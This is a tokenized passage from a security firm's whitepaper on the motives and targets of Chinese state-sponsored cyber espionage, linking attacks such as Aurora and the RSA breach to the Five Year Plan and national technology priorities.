"take", "the", "attitude", "that", "they", "would", "prefer", "not", "to", "know", "about", "security", "problems", "."], ["Information", "Technology", "departments", "may", "worry", "that", "commissioning", "a", "detection", "exercise", "to", "find", "compromised", "hosts", "in", "their", "environment", ",", "could", "reveal", "a", "series", "of", "attacks", "and", "the", "theft", "of", "data", ",", "which", "might", "not", "be", "good", "for", "their", "career", "prospects", "."], ["Higher", "up", "the", "management", "chain", ",", "board", "members", "may", "even", "choose", "not", "to", "spend", "money", "on", "security", "on", "the", "grounds", "that", "this", "will", "affect", "profitability", "and", "perhaps", "the", "size", "of", "their", "salaries", "or", "bonuses", "."], ["They", "may", "instead", "prefer", "to", "postpone", "any", "major", "spending", "on", "security", "until", "they", "absolutely", "have", "to", "."], ["Why", "Cyber", "?"], ["Clearly", ",", "the", "Chinese", "government", "is", "keen", "to", "understand", "the", "political", "decisions", "taken", "by", "other", "countries", "and", "the", "activities", "of", "opposition", "groups", "within", "China", ",", "so", "it", "is", "hardly", "surprising", "that", "it", "orchestrates", "the", "compromise", "of", "computers", "via", "emailed", "Trojan", "attachments", "or", "links", "to", "compromised", "websites", "on", "a", "large", "scale", "."], ["This", "is", "nothing", "new", ";", "just", "traditional", "espionage", "with", "a", "new", "methodology", "."], ["Until", "recently", "China", ",", "like", "most", "other", "developed", "countries", ",", "would", "have", "hand", "-", "picked", "intelligence", "officers", "from", "universities", "and", "the", "military", ",", "trained", "them", "in", "the", "arts", "of", "developing", "relationships", ",", "recruiting", "agents", "and", "how", "to", "covertly", "gather", "information", "to", "pass", "back", "to", "Beijing", "."], ["They", "would", "have", "been", "deployed", "to", "embassies", "overseas", "or", "under", "a", "business", "cover", "."], ["The", "arrival", "of", "the", "Internet", "did", "not", "sound", "the", "death", "knell", "for", "human", "spying", ",", "it", "simply", "offered", "an", "attractive", "alternative", "."], ["Moving", "espionage", "operations", "into", "the", "virtual", "world", "brings", "some", "advantages", "."], ["Firstly", ",", "it", "does", "not", "require", "anyone", "to", "be", "sent", "overseas", "."], ["This", "is", "an", "important", "change", "for", "the", "governments", "of", "communist", "countries", ",", "naturally", "suspicious", "of", "the", "long", "term", "intentions", "of", "even", "their", "most", "trusted", "officials", "."], ["It", "means", "there", "is", "less", "need", "to", "invest", "in", "lengthy", "training", "processes", "."], ["Instead", ",", "hacking", "operations", "can", "be", "broken", "down", "into", "simple", "tasks", "and", "partly", "automated", "to", "minimise", "the", "need", "for", "operators", "with", "advanced", "technical", "skills", "."], ["Conducting", "these", "operations", "is", "cheap", "and", "carries", "a", "lesser", "risk", "than", "human", "espionage", ":", "even", "if", "the", "target", "is", "fairly", "certain", "as", "to", "the", "origin", "of", "an", "attack", ",", "the", "sponsoring", "government", "can", "claim", "to", "be", "a", "victim", "of", "mistaken", "identity", "or", "of", "a", "western", "conspiracy", "."], ["But", "the", "key", "benefit", "of", "this", "type", "of", "espionage", "is", "that", "any", "piece", "of", "information", "stored", "anywhere", "in", "the", "world", "on", "a", "computer", "or", "a", "network", "connected", "to", "the", "Internet", "is", "only", "a", "few", "clicks", "away", "from", "being", "stolen", "."], ["There", "are", "even", "attacks", "that", "are", "designed", "to", "jump", "to", "computers", "not", "connected", "to", "the", "Internet", "."], ["If", "the", "prize", "is", "great", "enough", "and", "the", "attacker", "is", "determined", "enough", ",", "there", "is", "always", "a", "way", "."], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "6", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "How", "Cyber", "?"], ["This", "paper", "is", "not", "concerned", "with", "\u2018", "how", "\u2019", "the", "attacks", "happen", ",", "which", "is", "a", "subject", "for", "a", "white", "paper", "in", "its", "own", "right", "."], ["Typically", "however", ",", "the", "attackers", "target", "the", "desktops", "and", "laptops", "of", "the", "victim", "\u2019s", "organisation", "and", "send", "emails", "with", "an", "attachment", "containing", "an", "exploit", ",", "(", "often", "an", "Adobe", "PDF", "or", "Microsoft", "Office", "document", ")", "that", "is", "targeted", "at", "one", "person", "."], ["Once", "the", "victim", "opens", "the", "attachment", "the", "exploit", "executes", ",", "typically", "downloading", "and", "automatically", "installing", "a", "Trojan", ",", "which", "the", "attacker", "can", "then", "use", "to", "access", "the", "victim", "\u2019s", "system", "."], ["The", "attackers", "also", "utilise", "website", "vulnerabilities", "which", "exploit", "vulnerabilities", "in", "web", "browsers", "such", "as", "Internet", "Explorer", "or", "Firefox", "to", "download", "malicious", "code", "onto", "a", "machine", "when", "a", "user", "clicks", "on", "a", "link", "in", "an", "email", "."], ["Once", "the", "attacker", "has", "this", "foothold", "on", "the", "network", ",", "they", "typically", "look", "to", "download", "and", "use", "further", "hacking", "tools", "to", "escalate", "privileges", "to", "gain", "administrative", "access", "to", "key", "internal", "servers", "such", "as", "Domain", "Controllers", "or", "File", "Servers", "."], ["Once", "achieved", ",", "the", "attackers", "typically", "use", "another", "remote", "desktop", "or", "laptop", "on", "the", "network", "to", "collate", "the", "data", "stolen", "and", "exfilitrate", "it", "to", "their", "remote", "servers", "."], ["In", "the", "case", "that", "a", "network", "is", "fully", "patched", "and", "constitutes", "a", "hard", "target", ",", "the", "attackers", "can", "respond", "and", "raise", "their", "game", "substantially", "."], ["This", "could", "include", "exploiting", "a", "zero", "day", "vulnerability6", "or", "employing", "other", "means", "of", "installing", "an", "implant", ",", "such", "as", "using", "physical", "access", "to", "introduce", "an", "attack", "or", "even", "attacking", "a", "supply", "chain", "."], ["The", "Targets"], ["Despite", "opening", "up", "greatly", "over", "the", "last", "15", "years", ",", "China", "is", "still", "very", "much", "run", "by", "the", "Communist", "Party", "."], ["The", "Party", "has", "control", "over", "and", "involvement", "in", "every", "area", "of", "daily", "life", ",", "but", "despite", "the", "internal", "focus", ",", "China", "is", "careful", "to", "keep", "an", "eye", "on", "the", "outside", "world", "and", "how", "the", "country", "\u2019s", "institutions", "and", "companies", "are", "perceived", "by", "foreign", "governments", "."], ["An", "understanding", "of", "other", "countries", "\u2019", "political", "positions", "on", "key", "issues", "that", "affect", "China", "is", "key", "to", "forward", "planning", ",", "especially", "for", "an", "economy", "built", "on", "cheap", "exports", "."], ["The", "governments", "in", "which", "the", "Chinese", "state", "is", "most", "interested", "fall", "into", "three", "groups", ":", "its", "nearest", "neighbours", ":", "Japan", ",", "Taiwan", ",", "the", "disputed", "(", "semi", "-", "autonomous", ")", "Tibet", ",", "Mongolia", "and", "the", "Muslim", "\u2018", "Stans", "\u2019", "to", "the", "west", ";", "other", "powerful", "states", "with", "international", "influence", "such", "as", "the", "US", ",", "Russia", ",", "the", "UK", ",", "Germany", ",", "France", "and", "India", ";", "and", "finally", "states", "with", "strong", "economic", "links", "to", "China", "including", "Brazil", ",", "Iran", ",", "Australia", ",", "parts", "of", "Africa", "and", "Southeast", "Asia", "."], ["Whilst", "China", "will", "not", "be", "interested", "in", "the", "entire", "spectrum", "of", "government", "affairs", "in", "each", "of", "these", "countries", ",", "there", "will", "be", "some", "interest", "in", "some", "parts", "of", "all", "these", "governments", "\u2019", "activities", "."], ["Gathering", "information", "on", "this", "scale", "is", "a", "massive", "task", ":", "monitoring", "relevant", "issues", ",", "identifying", "individuals", "with", "access", "to", "that", "information", "and", "crafting", "attacks", "in", "the", "appropriate", "form", "and", "language", "."], ["The", "other", "constant", "preoccupation", "of", "the", "Chinese", "government", "is", "the", "maintenance", "of", "internal", "and", "external", "security", "."], ["The", "enemies", "of", "the", "internal", "state", "are", "referred", "to", "as", "the", "\u2018", "Five", "Poisons", "\u2019", ":", "the", "separatist", "Uighurs", "(", "a", "mainly", "Muslim", "group", "in", "Northeast", "China", ")", ",", "Tibetan", "separatists", ",", "pro", "-", "democracy", "supporters", ",", "supporters", "of", "an", "independent", "Taiwan", "and", "followers", "of", "the", "religious", "group", "Falun", "Gong", "."], ["Keeping", "tabs", "on", "these", "groups", "and", "on", "their", "known", "supporters", "at", "home", "and", "overseas", "is", "another", "huge", "task", "."], ["The", "Ministry", "of", "State", "Security", "monitors", "6", "A", "zero", "day", "vulnerability", "is", "one", "which", "is", "not", "publicly", "known", "and", "for", "which", "no", "patch", "exists", "."], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "7", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "the", "communications", "between", "individuals", "and", "groups", ",", "a", "task", "made", "considerably", "easier", "through", "the", "deployment", "of", "Trojans", "to", "compromise", "computer", "equipment", "."], ["As", "a", "minimum", ",", "security", "services", "would", "usually", "seek", "to", "steal", "email", "account", "login", "and", "password", "details", "in", "order", "to", "be", "able", "to", "log", "in", "remotely", "and", "read", "emails", "."], ["Google", "has", "confirmed", "this", "activity", "was", "taking", "place", "on", "the", "Gmail", "accounts", "of", "Chinese", "dissidents.7"], ["China", "wants", "a", "clear", "picture", "of", "other", "countries", "\u2019", "military", "activities", "in", "order", "to", "inform", "its", "own", "tactical", "and", "strategic", "decisions", "."], ["Human", "penetrations", "of", "foreign", "military", "organisations", "are", "extremely", "difficult", "and", "carry", "significant", "risks", ",", "so", "relatively", "passive", "email", "attacks", "are", "an", "excellent", "substitute", "activity", ",", "where", "no", "single", "incident", "can", "be", "seen", "as", "an", "act", "of", "aggression", "meriting", "a", "military", "response", "."], ["It", "remains", "to", "be", "seen", "whether", "thousands", "of", "attacks", "conducted", "over", "a", "long", "period", "of", "time", "will", "come", "to", "be", "regarded", "as", "having", "been", "a", "provocative", "act", "warranting", "a", "military", "response", "."], ["While", "China", "has", "been", "publicly", "\u2013", "albeit", "mostly", "not", "directly", "\u2013", "accused", "of", "carrying", "out", "attacks", "against", "governments", ",", "military", "organisations", "and", "military", "contractors", "numerous", "times", ",", "there", "are", "also", "plenty", "of", "examples", "of", "private", "sector", "organisations", "being", "targeted", "."], ["Several", "stand", "out", "from", "the", "last", "few", "years", ":", "the", "\u2018", "Aurora8", "\u2019", "attacks", "that", "hit", "Google", ",", "Adobe", ",", "Juniper", ",", "Northrup", "Grumman", "and", "others", ";", "the", "McAfee", "-", "dubbed", "\u2018", "Night", "Dragon9", "\u2019", "attacks", "that", "struck", "companies", "around", "the", "world", "in", "the", "energy", "sector", ";", "and", "the", "\u2018", "Shady", "RAT", "10", "\u2019", "attacks", "that", "affected", "the", "steel", "industry", ",", "heavy", "engineering", ",", "construction", "and", "communications", "companies", "and", "others", "."], ["Interestingly", ",", "despite", "reporting", "on", "the", "intrusions", ",", "McAfee", "does", "not", "highlight", "the", "fact", "that", "antivirus", "software", "did", "little", "to", "stop", "the", "attacks", "in", "the", "first", "place", "."], ["In", "all", "likelihood", "all", "these", "various", "\u2018", "operations", "\u2019", "formed", "part", "of", "the", "same", "attack", ",", "with", "different", "groups", "or", "military", "units", "carrying", "out", "operations", "sponsored", "by", "the", "Chinese", "state", "."], ["One", "attack", "that", "was", "clearly", "carefully", "planned", ",", "and", "equally", "linked", "to", "the", "others", ",", "was", "that", "conducted", "against", "RSA11", ",", "whereby", "attackers", "stole", "information", "which", "allowed", "them", "to", "replicate", "the", "SecurID", "tokens", "used", "by", "companies", "to", "authenticate", "individuals", "logging", "onto", "their", "networks", "from", "remote", "locations", "."], ["Armed", "with", "those", "stolen", "credentials", ",", "an", "attacker", "would", "be", "able", "to", "log", "in", "to", "company", "networks", "as", "if", "a", "real", "user", "."], ["The", "full", "extent", "of", "this", "breach", "has", "not", "been", "publicly", "disclosed", ",", "though", "we", "do", "know", "that", "Lockheed", "Martin", "was", "attacked", "and", "we", "can", "speculate", "that", "other", "defence", "contractors", "were", "also", "targeted", "."], ["As", "full", "details", "of", "what", "was", "stolen", "have", "never", "been", "put", "into", "the", "public", "domain", ",", "we", "can", "only", "guess", "at", "the", "targeted", "information", "."], ["Google", "claimed"], ["Intellectual", "Property", "had", "been", "stolen", ",", "though", "no", "further", "details", "were", "given", "."], ["But", "these", "companies", "were", "all", "targeted", "for", "a", "reason", "."], ["Data", "was", "identified", "that", "would", "somehow", "be", "of", "use", "to", "China", "."], ["We", "will", "look", "at", "who", "laid", "out", "the", "requirements", "for", "this", "data", "next", "."], ["7", "http://googleblog.blogspot.com/2010/01/new-approach-to-china.html", "8", "http://en.wikipedia.org/wiki/Operation_Aurora", "9", "http://www.mcafee.com/ca/resources/white-papers/wp-global-energy-cyberattacks-"], ["night-dragon.pdf", "10", "http://www.mcafee.com/us/resources/white-papers/wp-operation-shady-rat.pdf", "11", "http://www.rsa.com/node.aspx?id=3872", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "8", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "The", "Requirements"], ["We", "should", "never", "think", "of", "Chinese", "cyber", "attacks", "as", "uncoordinated", ",", "random", "or", "indiscriminate", "."], ["They", "target", "companies", ",", "governments", "or", "individuals", "because", "a", "specific", "requirement", "has", "been", "identified", "."], ["Context", "has", "studied", "a", "number", "of", "Chinese", "government", "policies", ",", "documents", "and", "stated", "aspirations", ",", "as", "well", "as", "Chinese", "commercial", "structures", ",", "which", "may", "show", "why", "targets", "may", "have", "been", "picked", ";", "and", "may", "also", "help", "companies", "to", "gauge", "whether", "their", "business", "should", "consider", "itself", "to", "be", "at", "risk", "of", "being", "targeted", "by", "a", "Chinese", "attacker", "."], ["The", "key", "documents", "are", "the", "Five", "Year", "Plan", "and", "the", "National"], ["Outline", "for", "Medium", "and", "Long", "Term", "S&T", "Development", "."], ["We", "will", "also", "theorise", "around", "the", "(", "unwritten", ")", "intelligence", "requirements", "."], ["We", "will", "then", "later", "investigate", "China", "\u2019s", "state", "-", "owned", "enterprises", "as", "potential", "generators", "of", "requests", "for", "material", "to", "be", "stolen", "via", "targeted", "attacks", ";", "and", "as", "consumers", "of", "stolen", "data", "."], ["The", "Five", "Year", "Plan", "is", "a", "series", "of", "development", "initiatives", ",", "both", "social", "and", "economic", ",", "that", "set", "high", "level", "goals", "for", "where", "the", "Communist", "Party", "would", "like", "to", "see", "the", "country", "in", "five", "years", "\u2019", "time", "."], ["The", "latest", "Plan", "was", "finalised", "in", "October", "2010", "and", "applies", "to", "the", "period", "2011", "\u2013", "2015", "."], ["It", "contains", "goals", "for", "urbanisation", "rates", "and", "targets", "for", "economic", "growth", ";", "details", "the", "foreign", "industries", "that", "will", "be", "invited", "to", "do", "business", "in", "China", ",", "the", "scale", "of", "proposed", "construction", "projects", "and", "areas", "of", "the", "country", "/", "economy", "where", "further", "development", "should", "be", "encouraged", "."], ["These", "high", "level", "goals", "filter", "down", "to", "all", "government", "departments", "at", "national", ",", "regional", "and", "local", "level", ",", "where", "individual", "initiatives", "are", "managed", "."], ["But", "the", "plan", "also", "hints", "at", "the", "areas", "where", "China", "feels", "it", "needs", "to", "concentrate", "its", "efforts", ",", "or", "where", "it", "needs", "to", "catch", "up", "with", "other", "countries", "elsewhere", "in", "the", "world", "."], ["However", ",", "targeted", "attacks", "are", "\u2018", "state", "sponsored", "\u2019", ",", "which", "means", "that", "it", "is", "not", "the", "government", "that", "conducts", "the", "attack", ",", "but", "departments", "of", "the", "state", "or", "affiliated", "groups", "."], ["When", "the", "government", "decides", "that", ",", "for", "example", ",", "it", "requires", "intelligence", "relating", "to", "US", "military", "operations", "in", "Afghanistan", ",", "different", "parts", "of", "the", "state", "intelligence", "apparatus", "will", "respond", "to", "this", "requirement", ",", "each", "bringing", "different", "skill", "sets", "to", "bear", "on", "the", "problem", "of", "finding", "the", "required", "information", "."], ["For", "example", ",", "the", "People", "\u2019s", "Liberation", "Army", "(", "PLA", ")", "has", "departments", "with", "access", "to", "satellite", "photography", ",", "which", "could", "provide", "information", "on", "troop", "movements", "."], ["Another", "department", "may", "have", "access", "to", "Signals", "Intelligence", "(", "SIGINT", ")", ",", "which", "intercepts", "communications", "."], ["Chinese", "diplomats", "in", "the", "country", "will", "speak", "with", "their", "Afghan", "counterparts", "about", "the", "situation", ",", "while", "intelligence", "officers", ",", "perhaps", "in", "diplomatic", "or", "even", "non", "-", "official", "roles", ",", "are", "able", "to", "exploit", "human", "agents", "with", "access", "to", "useful", "reporting", "."], ["To", "complement", "all", "of", "these", "sources", ",", "cyber", "attacks", "can", "be", "used", "against", "a", "variety", "of", "targets", "such", "as", "the", "Pentagon", ",", "military", "forces", "in", "theatre", ",", "the", "US", "embassy", ",", "defence", "contractors", "and", "representatives", "of", "the", "UN", "and", "NATO", "."], ["As", "cyber", "proves", "its", "worth", "(", "if", "it", "has", "n\u2019t", "already", ")", "other", "parts", "of", "the", "government", "will", "seek", "to", "develop", "their", "own", "cyber", "capability", "to", "add", "to", "their", "existing", "capabilities", ",", "not", "wishing", "to", "be", "outshone", "by", "competing", "departments", "."], ["One", "of", "the", "points", "on", "the", "Five", "Year", "Plan", "for", "instance", "is", "\u2018", "More", "efficient", "development", "of", "nuclear", "power", "under", "the", "precondition", "of", "ensured", "safety", "\u2019", ",", "which", "could", "suggest", "that", "any", "information", "gathering", "attacks", "against", "the", "nuclear", "energy", "industry", "(", "as", "opposed", "to", "sabotage", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "9", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "or", "Stuxnet12", "style", "attacks", ")", "could", "be", "carried", "out", "with", "the", "express", "intention", "of", "supporting", "this", "part", "of", "the", "Plan", "."], ["The", "attacks", "could", "be", "directed", "against", "nuclear", "plants", "themselves", "in", "an", "attempt", "to", "obtain", "operating", "information", ";", "construction", "companies", ",", "to", "steal", "building", "plans", "(", "which", "may", "also", "be", "of", "value", "to", "the", "military", "in", "case", "of", "war", ")", ";", "regulatory", "bodies", "for", "rules", ",", "policies", "and", "procedures", ";", "and", "any", "of", "the", "hundreds", "of", "companies", "that", "build", "parts", "for", "the", "plant", "or", "develop", "technology", "used", "in", "the", "nuclear", "process", "."], ["In", "terms", "of", "who", "could", "be", "carrying", "out", "the", "attacks", ",", "we", "have", "to", "consider", "not", "only", "the", "military"], ["(", "the", "Third", "Department", "of", "the", "PLA", "has", "the", "remit", "for", "cyber", "operations", ",", "though", "other", "areas", "are", "likely", "to", "have", "some", "capability", "too", ")", ",", "but", "also", "nuclear", "construction", "companies", ",", "the", "government", "department", "with", "a", "remit", "for", "the", "energy", "industry", ",", "or", "any", "of", "the", "hacking", "groups", "that", "are", "closely", "affiliated", "to", "the", "state", "."], ["Different", "campaigns", "may", "even", "be", "competing", "to", "steal", "the", "same", "information", "with", "the", "rewards", "going", "to", "the", "attackers", "who", "get", "it", "first", "."], ["The", "Plan", "also", "advocates", "the", "development", "of", "high", "-", "end", "manufacturing", ",", "hi", "-", "tech", "industry", ",", "modern", "agriculture", ",", "high", "-", "speed", "rail", "and", "hydropower", "."], ["The", "Plan", "does", "not", "explain", "in", "any", "detail", "how", "this", "development", "will", "be", "achieved", ",", "although", "in", "some", "cases", "it", "does", "specify", "that", "certain", "areas", "will", "be", "prioritised", "for", "direct", "foreign", "investment", "."], ["In", "these", "cases", ",", "foreign", "firms", "are", "invited", "to", "partner", "with", "local", "firms", "to", "complete", "a", "project", "and", "engage", "in", "\u2018", "technology", "transfer", "\u2019", "."], ["This", "means", "(", "officially", ")", "that", "the", "Chinese", "company", "will", "learn", "skills", "from", "the", "foreign", "company", "and", "develop", "their", "own", "capabilities", "in", "the", "area", "."], ["Unofficially", ",", "it", "generally", "ends", "up", "with", "the", "foreign", "company", "having", "its", "IP", "and", "technology", "stolen", "and", "then", "finding", "that", "it", "no", "longer", "has", "an", "invitation", "to", "do", "business", "in", "the", "country", "."], ["One", "good", "example", "of", "technology", "transfer", "can", "be", "seen", "in", "the", "area", "of", "high", "speed", "railways", "."], ["Originally", ",", "trains", "were", "purchased", "from", "Kawasaki", ",", "Siemens", "and", "Bombardier", "and", "these", "manufacturers", "helped", "create", "the", "first", "high", "speed", "lines", "which", "opened", "in", "2007", "."], ["Soon", "afterwards", "China", "started", "to", "build", "its", "own", "high", "speed", "trains", ",", "modelled", "on", "those", "imported", ",", "but", "with", "reconfigured", "components", "."], ["There", "is", "an", "ongoing", "legal", "case", "brought", "by", "Kawasaki", "and", "other", "Japanese", "companies", "relating", "to", "Chinese", "companies", "attempting", "to", "patent", "Kawasaki", "technology", "associated", "with", "high", "speed", "rail13", "."], ["The", "current", "Chinese", "patent", "laws", "specify", "that", "the", "owner", "of", "a", "patent", "registered", "in", "China", "must", "be", "Chinese", "and", "that", "the", "Chinese", "holder", "will", "also", "be", "favoured", "over", "any", "foreign", "claim", "for", "the", "same", "technology", "."], ["In", "July", "2011", "two", "high", "speed", "trains", "collided", "near", "Wenzhou", ",", "killing", "(", "according", "to", "state", "media", ")"], ["40", "people", "."], ["There", "were", "concerns", "that", "the", "trains", "contained", "stolen", "foreign", "technology", "and", "it", "has", "been", "suggested", "that", "this", "is", "why", "the", "wreckage", "was", "buried", "even", "before", "the", "rescue", "operation", "had", "been", "completed", "."], ["It", "has", "also", "been", "suggested", "in", "certain", "quarters", "that", "burying", "the", "wreckage", "stopped", "any", "investigation", "by", "the", "manufacturers", "into", "what", "went", "wrong", "(", "and", "whether", "or", "not", "there", "was", "stolen", "technology", "present", ")", "."], ["This", "action", "attracted", "widespread", "criticism", "of", "the", "government", ",", "even", "from", "some", "sources", "within", "China", "."], ["12", "13", "http://www.bbc.co.uk/news/technology-11388018"], ["http://online.wsj.com/article/SB10001424052748704814204575507353221141616.html", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "10", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Boosting", "Domestic", "Enterprise"], ["If", "the", "Five", "Year", "Plan", "is", "short", "on", "detail", ",", "the", "National", "Outline", "for", "Medium", "and", "Long", "Term", "S&T"], ["Development", "is", "not", "."], ["This", "policy", "essentially", "sets", "out", "the", "requirement", "for", "\u2018", "Indigenous", "Innovation", "\u2019", ",", "the", "areas", "where", "China", "should", "not", "rely", "on", "western", "technology", ",", "but", "should", "develop", "a", "home", "-", "grown", "alternative", "."], ["The", "strong", "desire", "for", "domestic", "products", "stems", "from", "two", "issues", "."], ["Firstly", "a", "suspicion", "that", "foreign", "technology", "could", "be", "used", "covertly", "in", "ways", "for", "which", "it", "was", "not", "originally", "intended", "it", "would", "be", "used", "(", "for", "the", "benefit", "of", "the", "attacking", "country", ")", "."], ["Secondly", "because", "in", "order", "to", "sustain", "high", "growth", "rates", "and", "satisfy", "domestic", "consumption", "it", "is", "better", "if", "China", "manufactures", "products", "of", "equal", "capability", "and", "sells", "them", "to", "its", "own", "market", "than", "it", "is", "to", "import", "goods", "at", "high", "prices", "."], ["The", "plan", "for", "Indigenous", "Innovation", "drills", "down", "into", "each", "of", "the", "areas", "where", "China", "wants", "to", "develop", "a", "capability", "in", "some", "detail", ",", "even", "setting", "out", "priorities", "."], ["The", "list", "of", "eleven", "areas", "comprises", ":", "Energy", "."], ["Oil", "and", "gas", "exploration", ",", "distribution", "and", "power", "grids", ",", "low", "cost", "renewable", "energy", ",", "coal", "liquefaction", ",", "industrial", "energy", "efficiency", "Water", "and", "Mineral", "Resources", "."], ["Distribution", ",", "conservation", ",", "desalination", ",", "zoning", "and", "development", "of", "resources", "Environment", "."], ["Pollutant", "control", "and", "recycling", ",", "restoration", "of", "vulnerable", "ecosystems", ",", "maritime", "ecosystem", "protection", ",", "environmental", "change", "Agriculture", "."], ["Genetic", "resource", "development", ",", "disease", "prevention", ",", "use", "of", "agro", "-", "forest", "biomass", ",", "multifunctional", "farming", "equipment", ",", "modern", "dairy", "industry", "Manufacturing", "Industry", "."], ["Basic", "/", "generic", "parts", "/", "components", ",", "digital", "intelligent", "design", ",", "recycling", "iron", "and", "steel", ",", "marine", "engineering", "technology", ",", "engineering", "processes", "for", "the", "defence", "industry", "Transportation", "."], ["Construction", "and", "maintenance", "technology", ",", "high", "speed", "rail", ",", "energy", "efficient", "cars", ",", "traffic", "control", "systems", ",", "alternative", "fuel", "based", "cars", "Modern", "Service", "Industry", "."], ["Next", "generation", "Internet", "technology", ",", "high", "performance", "computers", ",", "digital", "media", "content", "platforms", ",", "HD", "displays"], ["Population", "/", "Health", "."], ["Treatment", "of", "diseases", ",", "medical", "processes", "Urbanisation", "."], ["Green", "buildings", ",", "architectural", "energy", "efficiencies"], ["Public", "Security", "."], ["Security", "warning", "systems", ",", "bio", "-", "safety", "measures", "Defence", "."], ["[", "Classified", "]"], ["In", "addition", "to", "these", "areas", ",", "which", "already", "contain", "a", "lot", "of", "areas", "that", "targeted", "western", "companies", "operate", "in", ",", "there", "is", "a", "further", "list", "of", "16", "\u2018", "Major", "Special", "Projects", "\u2019", "."], ["These", "projects", "are", "intended", "to", "add", "to", "the", "overall", "strength", "of", "China", "."], ["Previous", "examples", "of", "such", "projects", "include", "the", "development", "of", "the", "hydrogen", "bomb", ",", "launching", "satellites", ",", "manned", "space", "flights", "and", "hybrid", "rice", "."], ["They", "are", "intended", "also", "to", "be", "a", "source", "of", "national", "pride", "."], ["If", "one", "can", "see", "the", "potential", "for", "cyber", "attack", "to", "enhance", "many", "of", "the", "areas", "outlined", "above", ",", "the", "list", "below", "gives", "even", "more", "scope", "for", "the", "targeted", "theft", "of", "data", "from", "companies", "and", "governments", "around", "the", "world", ":"], ["Core", "electronic", "components", ",", "high", "-", "end", "general", "use", "chips", "and", "basic", "software", "products"], ["Large", "-", "scale", "integrated", "circuit", "manufacturing", "equipment", "and", "techniques", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "11", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "New", "generation", "broadband", "wireless", "mobile", "communication", "networks"], ["Advanced", "numeric", "-", "controlled", "machinery", "and", "basic", "manufacturing", "technology"], ["Large", "-", "scale", "oil", "and", "gas", "exploration"], ["Large", "advanced", "nuclear", "reactors", "Water", "pollution", "control", "and", "treatment"], ["Breeding", "new", "varieties", "of", "genetically", "modified", "organisms", "Pharmaceutical", "innovation", "and", "development", "Control", "and", "treatment", "of", "AIDS", ",", "hepatitis", ",", "and", "other", "major", "diseases"], ["Large", "aircraft", "High", "-", "definition", "earth", "observation", "system"], ["Manned", "spaceflight", "and", "lunar", "probe", "programs", "Classified", "military", "projects", "(", "x3", ")"], ["If", "we", "take", "the", "Major", "Special", "Projects", "as", "a", "Chinese", "technology", "wish", "list", ",", "we", "can", "assume", "there", "are", "two", "different", "methods", "that", "could", "be", "used", "to", "achieve", "these", "goals", "."], ["The", "first", "involves", "funding", "research", "programmes", "in", "universities", "and", "companies", ",", "educating", "people", "over", "the", "long", "term", "and", "encouraging", "a", "culture", "of", "research", ",", "development", "and", "innovation", "and", "an", "acceptance", "that", "achievements", "in", "some", "areas", "will", "fall", "short", "of", "expectation", "."], ["The", "second", "way", "of", "viewing", "the", "challenge", "is", "that", "much", "of", "this", "technology", "already", "exists", "in", "the", "rest", "of", "the", "world", ",", "is", "already", "proven", "and", "is", "(", "relatively", ")", "easy", "to", "obtain", "."], ["Far", "easier", "to", "steal", "the", "work", "of", "others", ",", "re", "-", "engineer", "it", ",", "improve", "it", "if", "practicable", "and", "necessary", "and", "be", "seen", "to", "be", "contributing", "to", "the", "progression", "of", "the", "Chinese", "state", ";", "and", "to", "do", "so", "may", "also", "be", "personally", "rewarding", "for", "members", "of", "the", "Party", "."], ["Failure", "to", "achieve", "these", "goals", "would", "almost", "certainly", "be", "seen", "as", "unacceptable", "."], ["At", "Risk"], ["The", "companies", "that", "generate", "the", "target", "information", "are", "not", "the", "only", "ones", "at", "risk", "."], ["We", "can", "also", "assume", "that", "the", "companies", "that", "support", "these", "areas", "\u2013", "lawyers", ",", "sub", "-", "contractors", ",", "outsourced", "suppliers", "and", "any", "government", "departments", "with", "links", "to", "these", "firms", ",", "would", "also", "be", "attacked", "as", "part", "of", "an", "effort", "to", "find", "supporting", "information", "."], ["So", "long", "as", "the", "product", "is", "intended", "for", "domestic", "consumption", "only", ",", "in", "many", "cases", "there", "are", "minimal", "problems", "for", "the", "company", "targeted", "to", "have", "to", "face", "."], ["Many", "firms", "would", "be", "unwilling", "or", "unable", "to", "sell", "their", "products", "into", "China", "anyway", "\u2013", "either", "because", "of", "a", "lack", "of", "global", "distribution", "networks", ",", "or", "because", "of", "export", "restrictions", ",", "in", "the", "case", "of", "sensitive", "military", "technologies", ",", "so", "the", "sale", "of", "an", "identical", ",", "stolen", "product", "would", "not", "directly", "harm", "their", "business", "."], ["For", "example", ",", "a", "company", "that", "makes", "hi", "-", "tech", "export", "controlled", "widgets", "for", "the", "US", "military", "is", "unlikely", "to", "be", "able", "to", "sell", "its", "product", "in", "China", "to", "the", "Chinese", "military", "."], ["In", "any", "case", ",", "the", "Chinese", "military", "would", "probably", "prefer", "to", "buy", "a", "Chinese", "product", "."], ["If", "the", "widget", "designs", "are", "stolen", "and", "a", "Chinese", "company", "makes", "the", "exact", "same", "widget", ",", "protected", "by", "a", "Chinese", "patent", ",", "the", "end", "product", "could", "be", "sold", "to", "the", "PLA", "."], ["While", "the", "original", "manufacturer", "may", "rightly", "be", "concerned", "by", "this", ",", "the", "company", "would", "not", "suffer", 